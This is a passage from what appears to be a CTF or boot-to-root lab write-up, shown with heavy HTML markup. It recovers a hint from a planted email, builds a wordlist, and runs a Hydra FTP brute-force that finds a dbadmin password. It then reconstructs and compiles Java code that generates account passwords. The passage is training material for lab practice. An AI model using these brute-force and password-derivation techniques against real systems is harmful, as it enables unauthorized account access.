<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sdadmin@slax:~$ cat mailserv_download/2010122015043.j15Htu1H341102
</span><span class='line'>To: &lt;a href="&#x6d;&#x61;&#x69;&#x6c;&#116;&#x6f;&#x3a;&#115;&#x64;&#97;&#x64;&#109;&#105;&#110;&#64;&#x6e;&#111;&#x73;&#101;&#99;&#x62;&#97;&#110;&#x6b;&#x2e;&#x63;&#111;&#109;">&#x73;&#100;&#97;&#100;&#x6d;&#105;&#x6e;&#64;&#x6e;&#111;&#115;&#101;&#x63;&#x62;&#97;&#x6e;&#x6b;&#46;&#99;&#x6f;&#109;&lt;/a>
</span><span class='line'>CC:
</span><span class='line'>Subject: RE: My Son&rsquo;s Birthday
</span><span class='line'>Date: Mon, 20 Dec 2010 15:04:32 +0500
</span><span class='line'>Return-Path: &lt;a href="&#109;&#x61;&#x69;&#x6c;&#116;&#x6f;&#58;&#x63;&#x73;&#97;&#100;&#109;&#x69;&#110;&#x40;&#x6e;&#x6f;&#x73;&#101;&#99;&#x62;&#97;&#x6e;&#107;&#46;&#99;&#x6f;&#109;">&#x63;&#115;&#97;&#x64;&#109;&#105;&#110;&#64;&#x6e;&#x6f;&#x73;&#101;&#x63;&#x62;&#97;&#110;&#x6b;&#46;&#x63;&#111;&#x6d;&lt;/a>
</span><span class='line'>Delived-To: sdadmin:&lt;a href="&#x6d;&#97;&#x69;&#x6c;&#x74;&#x6f;&#x3a;&#110;&#x6f;&#115;&#x65;&#x63;&#98;&#97;&#x6e;&#107;&#x2e;&#x63;&#x6f;&#109;&#64;&#110;&#x6f;&#x73;&#101;&#99;&#98;&#97;&#x6e;&#x6b;&#46;&#x63;&#x6f;&#x6d;">&#110;&#x6f;&#115;&#101;&#x63;&#x62;&#97;&#110;&#x6b;&#46;&#99;&#111;&#x6d;&#x40;&#110;&#111;&#x73;&#101;&#99;&#x62;&#97;&#x6e;&#x6b;&#46;&#x63;&#111;&#x6d;&lt;/a>
</span><span class='line'>Received: (qmail 20281 invoked from network); 20 Dec 2010 10:04:32 -0000
</span><span class='line'>X-Received: from network (192.168.1.123) by mailserv3-4.us6.service.com;
</span><span class='line'>20 Dec 2010 10:04:32 -0000
</span><span class='line'>Received: from www.nosecbank.com (unknown [198.65.139.32]) by
</span><span class='line'>srv3.us6.service.com (Postfix) with ESMTP id D98214787FD for
</span><span class='line'>&lt;csadmin@nosecbank.com; Mon, 20 Dec 2010 10:04:32 +0000 (GMT)
</span><span class='line'>Message-Id: &lt;a href="&#x6d;&#x61;&#x69;&#108;&#116;&#111;&#x3a;&#50;&#x30;&#49;&#48;&#x31;&#x32;&#50;&#x30;&#49;&#x35;&#x30;&#52;&#51;&#46;&#106;&#49;&#x35;&#72;&#x74;&#117;&#x31;&#x48;&#x33;&#52;&#49;&#49;&#x30;&#x32;&#64;&#x77;&#119;&#119;&#46;&#110;&#111;&#x73;&#101;&#x63;&#x62;&#97;&#110;&#107;&#46;&#99;&#111;&#109;">&#x32;&#48;&#x31;&#48;&#49;&#50;&#x32;&#x30;&#49;&#53;&#48;&#52;&#x33;&#46;&#x6a;&#x31;&#x35;&#72;&#x74;&#x75;&#x31;&#x48;&#51;&#52;&#x31;&#x31;&#48;&#x32;&#x40;&#x77;&#119;&#119;&#x2e;&#x6e;&#x6f;&#x73;&#x65;&#99;&#x62;&#x61;&#110;&#x6b;&#x2e;&#x63;&#x6f;&#x6d;&lt;/a>
</span><span class='line'>Mime-Version: 1.0
</span><span class='line'>Content-Type: multipart/alternative;
</span><span class='line'>boundary=&ldquo;&mdash;=_NextPart_000_0000_05F11S20.FGHZWE49&rdquo;
</span><span class='line'>X-Mailer: K-Mail; Build 1.0.5510
</span><span class='line'>Thread-Index: Aa5fqAwT8nsBe3T3T5q67a3Fd22XsZ==
</span><span class='line'>Message: Hey there Paul!  I would gladly bring myself and my son over
</span><span class='line'>tomorrow after work!  I would only be hesitant to come over if you
</span><span class='line'>invited Fred over too&hellip; He just freaks me out sometimes.  It doesnt
</span><span class='line'>help that he locks himself up in his office and is anti-social during
</span><span class='line'>lunch hours&hellip; On top of that he calls himself the &ldquo;databaser&rdquo;!  I mean,
</span><span class='line'>who in thier right mind does that?  Either way, I will most likely be
</span><span class='line'>there tomorrow.  I look forward to it!   -Mark</span></code></pre></td></tr></table></div></figure></p>

<p>So the dbadmin&rsquo;s password could be related with the word databaser:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# for i in {1..9999}; do echo databaser$i; echo &ldquo;$i"databaser; echo Databaser$i; echo &rdquo;$i"Databaser; done > wl
</span><span class='line'>root@kali32:~# hydra -l dbadmin 192.168.1.20 ftp -P wl
</span><span class='line'>Hydra v8.1 &copy; 2014 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>Hydra (&lt;a href="http://www.thc.org/thc-hydra">http://www.thc.org/thc-hydra&lt;/a>) starting at 2015-05-08 06:21:55
</span><span class='line'>[DATA] max 16 tasks per 1 server, overall 64 tasks, 39996 login tries (l:1/p:39996), ~39 tries per task
</span><span class='line'>[DATA] attacking service ftp on port 21
</span><span class='line'>[21][ftp] host: 192.168.1.20   login: dbadmin   password: databaser60
</span><span class='line'>1 of 1 target successfully completed, 1 valid password found
</span><span class='line'>Hydra (&lt;a href="http://www.thc.org/thc-hydra">http://www.thc.org/thc-hydra&lt;/a>) finished at 2015-05-08 06:21:55</span></code></pre></td></tr></table></div></figure></p>

<p>We extract the last part of the email and put everything together:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="mi">1</span>       <span class="o">/&lt;</span><span class="n">em</span><span class="o">&gt;</span><span class="n">input</span> <span class="n">is</span> <span class="n">username</span> <span class="n">of</span> <span class="n">account</span><span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;/</span>
</span><span class='line'><span class="mi">2</span>       <span class="kt">int</span><span class="o">[]</span> <span class="nf">processLoop</span><span class="o">(</span><span class="n">String</span> <span class="n">input</span><span class="o">){</span>
</span><span class='line'><span class="mi">3</span>         <span class="kt">int</span> <span class="n">strL</span><span class="o">=</span><span class="n">input</span><span class="o">.</span><span class="na">length</span><span class="o">;&lt;</span><span class="n">br</span><span class="o">/&gt;</span>
</span><span class='line'><span class="mi">4</span>         <span class="kt">int</span> <span class="n">lChar</span><span class="o">=(</span><span class="kt">int</span><span class="o">)</span><span class="n">input</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="n">strL</span><span class="o">-</span><span class="mi">1</span><span class="o">);</span>
</span><span class='line'><span class="mi">5</span>         <span class="kt">int</span> <span class="n">fChar</span><span class="o">=(</span><span class="kt">int</span><span class="o">)</span><span class="n">input</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="mi">0</span><span class="o">);</span>
</span><span class='line'><span class="mi">6</span>         <span class="kt">int</span><span class="o">[]</span> <span class="n">encArr</span> <span class="o">=</span> <span class="kt">int</span><span class="o">[</span><span class="n">strL</span><span class="o">+</span><span class="mi">2</span><span class="o">];&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="mi">7</span>         <span class="nf">for</span><span class="o">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="o">;</span><span class="n">i</span><span class="o">&amp;</span><span class="n">lt</span><span class="o">;</span><span class="n">strL</span><span class="o">+</span><span class="mi">1</span><span class="o">;</span><span class="n">i</span><span class="o">++){</span>
</span><span class='line'><span class="mi">8</span>           <span class="n">encArr</span><span class="o">[</span><span class="n">i</span><span class="o">]=(</span><span class="kt">int</span><span class="o">)</span><span class="n">input</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="n">i</span><span class="o">-</span><span class="mi">1</span><span class="o">);}</span>
</span><span class='line'><span class="mi">9</span>           <span class="n">encArr</span><span class="o">[</span><span class="mi">0</span><span class="o">]=(</span><span class="kt">int</span><span class="o">)</span><span class="n">lChar</span><span class="o">;</span> <span class="o">&lt;</span><span class="n">br</span><span class="o">/&gt;</span>
</span><span class='line'><span class="mi">10</span>          <span class="n">encArr</span><span class="o">[</span><span class="n">encArr</span><span class="o">.</span><span class="na">length</span><span class="o">-</span><span class="mi">1</span><span class="o">]=(</span><span class="kt">int</span><span class="o">)</span><span class="n">fChar</span><span class="o">;</span>
</span><span class='line'><span class="mi">11</span>          <span class="n">encArr</span><span class="o">=</span><span class="n">backLoop</span><span class="o">(</span><span class="n">encArr</span><span class="o">);</span>
</span><span class='line'><span class="mi">12</span>          <span class="n">encArr</span><span class="o">=</span><span class="n">loopBack</span><span class="o">(</span><span class="n">encArr</span><span class="o">);</span>
</span><span class='line'><span class="mi">13</span>          <span class="n">encArr</span><span class="o">=</span><span class="n">loopProcesS</span><span class="o">(</span><span class="n">encArr</span><span class="o">);&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="mi">14</span>          <span class="kt">int</span> <span class="n">j</span><span class="o">=</span><span class="n">encArr</span><span class="o">.</span><span class="na">length</span><span class="o">-</span><span class="mi">1</span><span class="o">;&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="mi">15</span>          <span class="nf">for</span><span class="o">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="o">;</span><span class="n">i</span><span class="o">&amp;</span><span class="n">lt</span><span class="o">;</span><span class="n">encArr</span><span class="o">;</span><span class="n">i</span><span class="o">++){</span>
</span><span class='line'><span class="mi">16</span>            <span class="k">if</span><span class="o">(</span><span class="n">i</span><span class="o">==</span><span class="n">j</span><span class="o">)</span> <span class="k">break</span><span class="o">;</span>
</span><span class='line'><span class="mi">17</span>              <span class="kt">int</span> <span class="n">t</span><span class="o">=</span><span class="n">encArr</span><span class="o">[</span><span class="n">i</span><span class="o">];</span>
</span><span class='line'><span class="mi">18</span>              <span class="n">encArr</span><span class="o">[</span><span class="n">i</span><span class="o">]=</span><span class="n">encArr</span><span class="o">[</span><span class="n">j</span><span class="o">];</span>
</span><span class='line'><span class="mi">19</span>              <span class="n">encArr</span><span class="o">[</span><span class="n">j</span><span class="o">]=</span><span class="n">t</span><span class="o">;</span><span class="n">j</span><span class="o">&amp;</span><span class="n">ndash</span><span class="o">;;}</span>     <span class="o">&lt;</span><span class="n">br</span><span class="o">/&gt;</span>
</span><span class='line'><span class="mi">20</span>      <span class="k">return</span> <span class="n">encArr</span><span class="o">;}&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="mi">21</span>      <span class="o">/&lt;</span><span class="n">em</span><span class="o">&gt;</span><span class="n">Note</span> <span class="n">the</span> <span class="n">pseudocode</span> <span class="n">will</span> <span class="n">be</span> <span class="n">implemented</span> <span class="n">with</span> <span class="n">the</span>
</span><span class='line'><span class="mi">22</span>      <span class="n">root</span> <span class="n">account</span> <span class="n">and</span> <span class="n">my</span> <span class="n">account</span><span class="o">,</span> <span class="n">we</span> <span class="n">still</span> <span class="n">need</span> <span class="n">to</span> <span class="n">implement</span> <span class="n">it</span> <span class="n">with</span> <span class="n">the</span> <span class="n">csadmin</span><span class="o">,</span> <span class="n">sdadmin</span><span class="o">,</span> <span class="o">&lt;</span><span class="n">br</span><span class="o">/&gt;</span>
</span><span class='line'><span class="mi">23</span>      <span class="n">and</span> <span class="n">dbadmin</span> <span class="n">accounts</span> <span class="n">though</span><span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;/&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="mi">24</span>      <span class="kt">int</span><span class="o">[]</span> <span class="nf">backLoop</span><span class="o">(</span><span class="kt">int</span><span class="o">[]</span> <span class="n">input</span><span class="o">){</span>
</span><span class='line'><span class="mi">25</span>        <span class="kt">int</span> <span class="n">ref</span><span class="o">=</span><span class="n">input</span><span class="o">.</span><span class="na">length</span><span class="o">;</span> <span class="o">&lt;</span><span class="n">br</span><span class="o">/&gt;</span>
</span><span class='line'><span class="mi">26</span>        <span class="kt">int</span> <span class="n">a</span><span class="o">=</span><span class="n">input</span><span class="o">[</span><span class="mi">1</span><span class="o">];</span> <span class="kt">int</span> <span class="n">b</span><span class="o">=</span><span class="n">input</span><span class="o">[</span><span class="n">ref</span><span class="o">-</span><span class="mi">1</span><span class="o">];</span>
</span><span class='line'><span class="mi">27</span>        <span class="kt">int</span> <span class="n">ch</span><span class="o">=(</span><span class="n">a</span><span class="o">+</span><span class="n">b</span><span class="o">)/</span><span class="mi">2</span><span class="o">;&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="mi">28</span>        <span class="nf">for</span><span class="o">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="o">;</span><span class="n">i</span><span class="o">&amp;</span><span class="n">lt</span><span class="o">;</span><span class="n">ref</span><span class="o">;</span><span class="n">i</span><span class="o">++){</span>
</span><span class='line'><span class="mi">29</span>          <span class="k">if</span><span class="o">(</span><span class="n">i</span><span class="o">%</span><span class="mi">2</span><span class="o">==</span><span class="mi">0</span><span class="o">)</span> <span class="n">input</span><span class="o">[</span><span class="n">i</span><span class="o">]=(</span><span class="n">input</span><span class="o">[</span><span class="n">i</span><span class="o">]%</span><span class="n">check</span><span class="o">)+(</span><span class="n">ref</span><span class="o">+</span><span class="n">i</span><span class="o">);</span>
</span><span class='line'><span class="mi">30</span>          <span class="k">else</span> <span class="n">input</span><span class="o">[</span><span class="n">i</span><span class="o">]=(</span><span class="n">input</span><span class="o">[</span><span class="n">i</span><span class="o">]+</span><span class="n">ref</span><span class="o">+</span><span class="n">i</span><span class="o">);}</span>
</span><span class='line'><span class="mi">31</span>      <span class="k">return</span> <span class="n">input</span><span class="o">;}&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="mi">32</span>      <span class="kt">int</span><span class="o">[]</span> <span class="nf">loopBack</span><span class="o">(</span><span class="kt">int</span><span class="o">[]</span> <span class="n">input</span><span class="o">){</span>
</span><span class='line'><span class="mi">33</span>        <span class="kt">int</span> <span class="n">ref</span><span class="o">=</span><span class="n">input</span><span class="o">.</span><span class="na">length</span><span class="o">/</span><span class="mi">2</span><span class="o">;</span>
</span><span class='line'><span class="mi">34</span>        <span class="kt">int</span><span class="o">[]</span> <span class="n">encNew</span> <span class="o">=</span><span class="kt">int</span><span class="o">[</span><span class="n">input</span><span class="o">.</span><span class="na">length</span><span class="o">+</span><span class="n">ref</span><span class="o">];</span>
</span><span class='line'><span class="mi">35</span>        <span class="kt">int</span> <span class="n">ch</span><span class="o">=</span><span class="mi">0</span><span class="o">;&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="mi">36</span>        <span class="nf">for</span><span class="o">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=(</span><span class="n">ref</span><span class="o">/</span><span class="mi">2</span><span class="o">);</span><span class="n">i</span><span class="o">&amp;</span><span class="n">lt</span><span class="o">;</span><span class="n">input</span><span class="o">.</span><span class="na">length</span><span class="o">;</span><span class="n">i</span><span class="o">++)</span> <span class="o">{</span>
</span><span class='line'><span class="mi">37</span>          <span class="n">encNew</span><span class="o">[</span><span class="n">i</span><span class="o">]=</span><span class="n">input</span><span class="o">[</span><span class="n">ch</span><span class="o">];</span> <span class="n">ch</span><span class="o">++;}</span>
</span><span class='line'><span class="mi">38</span>          <span class="k">for</span><span class="o">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="o">;</span><span class="n">i</span><span class="o">&amp;</span><span class="n">lt</span><span class="o">;</span><span class="n">encNew</span><span class="o">.</span><span class="na">length</span><span class="o">;</span><span class="n">i</span><span class="o">++){</span>
</span><span class='line'><span class="mi">39</span>            <span class="k">if</span><span class="o">(</span><span class="n">encNew</span><span class="o">[</span><span class="n">i</span><span class="o">]&amp;</span><span class="n">lt</span><span class="o">;=</span><span class="mi">33</span><span class="o">)</span> <span class="n">encNew</span><span class="o">[</span><span class="n">i</span><span class="o">]=</span><span class="mi">33</span><span class="o">+(++</span><span class="n">ref</span><span class="o">&lt;</span><span class="n">em</span><span class="o">&gt;</span><span class="mi">2</span><span class="o">);</span>
</span><span class='line'><span class="mi">40</span>            <span class="k">else</span> <span class="nf">if</span><span class="o">(</span><span class="n">encNew</span><span class="o">[</span><span class="n">i</span><span class="o">]&gt;=</span><span class="mi">126</span><span class="o">)</span> <span class="n">encNew</span><span class="o">[</span><span class="n">i</span><span class="o">]=</span><span class="mi">126</span><span class="o">-(&amp;</span><span class="n">ndash</span><span class="o">;</span><span class="n">ref</span><span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;</span><span class="mi">2</span><span class="o">);</span>
</span><span class='line'><span class="mi">41</span>            <span class="k">else</span><span class="o">{</span> <span class="o">&lt;</span><span class="n">br</span><span class="o">/&gt;</span>
</span><span class='line'><span class="mi">42</span>              <span class="k">if</span><span class="o">(</span><span class="n">i</span><span class="o">%</span><span class="mi">2</span><span class="o">==</span><span class="mi">0</span><span class="o">)</span> <span class="n">encNew</span><span class="o">[</span><span class="n">i</span><span class="o">]-=(</span><span class="n">i</span><span class="o">%</span><span class="mi">3</span><span class="o">);</span>
</span><span class='line'><span class="mi">43</span>              <span class="k">else</span> <span class="n">encNew</span><span class="o">[</span><span class="n">i</span><span class="o">]+=(</span><span class="n">i</span><span class="o">%</span><span class="mi">2</span><span class="o">);}}</span>
</span><span class='line'><span class="mi">44</span>      <span class="k">return</span> <span class="n">encNew</span><span class="o">;}&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="mi">45</span>      <span class="kt">int</span><span class="o">[]</span> <span class="nf">loopProcess</span><span class="o">(</span><span class="kt">int</span><span class="o">[]</span> <span class="n">input</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'><span class="mi">46</span>        <span class="k">for</span><span class="o">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="o">;</span><span class="n">i</span><span class="o">&amp;</span><span class="n">lt</span><span class="o">;</span><span class="n">input</span><span class="o">.</span><span class="na">length</span><span class="o">;</span><span class="n">i</span><span class="o">++){</span>
</span><span class='line'><span class="mi">47</span>          <span class="k">if</span><span class="o">(</span><span class="n">input</span><span class="o">[</span><span class="n">i</span><span class="o">]==</span><span class="mi">40</span><span class="o">||</span><span class="n">input</span><span class="o">[</span><span class="n">i</span><span class="o">]==</span><span class="mi">41</span><span class="o">)</span> <span class="n">input</span><span class="o">[</span><span class="n">i</span><span class="o">]+=</span><span class="n">input</span><span class="o">.</span><span class="na">length</span><span class="o">;</span>
</span><span class='line'><span class="mi">48</span>          <span class="k">else</span> <span class="nf">if</span><span class="o">(</span><span class="n">input</span><span class="o">[</span><span class="n">i</span><span class="o">]==</span><span class="mi">45</span><span class="o">)</span> <span class="n">input</span><span class="o">[</span><span class="n">i</span><span class="o">]+=</span><span class="mi">20</span><span class="o">+</span><span class="n">i</span><span class="o">;}</span>
</span><span class='line'><span class="mi">49</span>      <span class="k">return</span> <span class="n">input</span><span class="o">;}</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>After fixing minor issues, we compile the code in Java:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="kd">public</span> <span class="kd">class</span> <span class="nc">test</span> <span class="o">{&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">pre</span><span class="o">&gt;&lt;</span><span class="n">code</span><span class="o">&gt;</span> <span class="cm">/*input is username of account*/</span>
</span><span class='line'> <span class="kd">static</span> <span class="kt">int</span><span class="o">[]</span> <span class="nf">processLoop</span><span class="o">(</span><span class="n">String</span> <span class="n">input</span><span class="o">){</span>
</span><span class='line'>   <span class="kt">int</span> <span class="n">strL</span><span class="o">=</span><span class="n">input</span><span class="o">.</span><span class="na">length</span><span class="o">();</span>
</span><span class='line'>   <span class="kt">int</span> <span class="n">lChar</span><span class="o">=(</span><span class="kt">int</span><span class="o">)</span><span class="n">input</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="n">strL</span><span class="o">-</span><span class="mi">1</span><span class="o">);</span>
</span><span class='line'>   <span class="kt">int</span> <span class="n">fChar</span><span class="o">=(</span><span class="kt">int</span><span class="o">)</span><span class="n">input</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="mi">0</span><span class="o">);</span>
</span><span class='line'>   <span class="kt">int</span><span class="o">[]</span> <span class="n">encArr</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">int</span><span class="o">[</span><span class="n">strL</span><span class="o">+</span><span class="mi">2</span><span class="o">];</span>
</span><span class='line'>
</span><span class='line'>   <span class="k">for</span><span class="o">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">1</span><span class="o">;</span><span class="n">i</span><span class="o">&amp;</span><span class="n">lt</span><span class="o">;</span><span class="n">strL</span><span class="o">+</span><span class="mi">1</span><span class="o">;</span><span class="n">i</span><span class="o">++){</span>
</span><span class='line'>     <span class="n">encArr</span><span class="o">[</span><span class="n">i</span><span class="o">]=(</span><span class="kt">int</span><span class="o">)</span><span class="n">input</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="n">i</span><span class="o">-</span><span class="mi">1</span><span class="o">);}</span>
</span><span class='line'>     <span class="n">encArr</span><span class="o">[</span><span class="mi">0</span><span class="o">]=(</span><span class="kt">int</span><span class="o">)</span><span class="n">lChar</span><span class="o">;</span>
</span><span class='line'>     <span class="n">encArr</span><span class="o">[</span><span class="n">encArr</span><span class="o">.</span><span class="na">length</span><span class="o">-</span><span class="mi">1</span><span class="o">]=(</span><span class="kt">int</span><span class="o">)</span><span class="n">fChar</span><span class="o">;</span>
</span><span class='line'>     <span class="n">encArr</span><span class="o">=</span><span class="n">backLoop</span><span class="o">(</span><span class="n">encArr</span><span class="o">);</span>
</span><span class='line'>     <span class="n">encArr</span><span class="o">=</span><span class="n">loopBack</span><span class="o">(</span><span class="n">encArr</span><span class="o">);</span>
</span><span class='line'>     <span class="n">encArr</span><span class="o">=</span><span class="n">loopProcess</span><span class="o">(</span><span class="n">encArr</span><span class="o">);</span>
</span><span class='line'>
</span><span class='line'>     <span class="kt">int</span> <span class="n">j</span><span class="o">=</span><span class="n">encArr</span><span class="o">.</span><span class="na">length</span><span class="o">-</span><span class="mi">1</span><span class="o">;</span>
</span><span class='line'>
</span><span class='line'>     <span class="k">for</span><span class="o">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="o">;</span><span class="n">i</span><span class="o">&amp;</span><span class="n">lt</span><span class="o">;</span><span class="n">encArr</span><span class="o">.</span><span class="na">length</span><span class="o">;</span><span class="n">i</span><span class="o">++){</span>
</span><span class='line'>       <span class="k">if</span><span class="o">(</span><span class="n">i</span><span class="o">==</span><span class="n">j</span><span class="o">)</span> <span class="k">break</span><span class="o">;</span>
</span><span class='line'>         <span class="kt">int</span> <span class="n">t</span><span class="o">=</span><span class="n">encArr</span><span class="o">[</span><span class="n">i</span><span class="o">];</span>
</span><span class='line'>         <span class="n">encArr</span><span class="o">[</span><span class="n">i</span><span class="o">]=</span><span class="n">encArr</span><span class="o">[</span><span class="n">j</span><span class="o">];</span>
</span><span class='line'>         <span class="n">encArr</span><span class="o">[</span><span class="n">j</span><span class="o">]=</span><span class="n">t</span><span class="o">;</span><span class="n">j</span><span class="o">--;}</span>
</span><span class='line'> <span class="k">return</span> <span class="n">encArr</span><span class="o">;}</span>
</span><span class='line'>
</span><span class='line'> <span class="cm">/*Note the pseudocode will be implemented with the </span>
</span><span class='line'><span class="cm"> root account and my account, we still need to implement it with the csadmin, sdadmin,   </span>
</span><span class='line'><span class="cm"> and dbadmin accounts though*/</span>
</span><span class='line'>
</span><span class='line'> <span class="kd">static</span> <span class="kt">int</span><span class="o">[]</span> <span class="nf">backLoop</span><span class="o">(</span><span class="kt">int</span><span class="o">[]</span> <span class="n">input</span><span class="o">){</span>
</span><span class='line'>   <span class="kt">int</span> <span class="n">ref</span><span class="o">=</span><span class="n">input</span><span class="o">.</span><span class="na">length</span><span class="o">;</span>
</span><span class='line'>   <span class="kt">int</span> <span class="n">a</span><span class="o">=</span><span class="n">input</span><span class="o">[</span><span class="mi">1</span><span class="o">];</span> <span class="kt">int</span> <span class="n">b</span><span class="o">=</span><span class="n">input</span><span class="o">[</span><span class="n">ref</span><span class="o">-</span><span class="mi">1</span><span class="o">];</span>
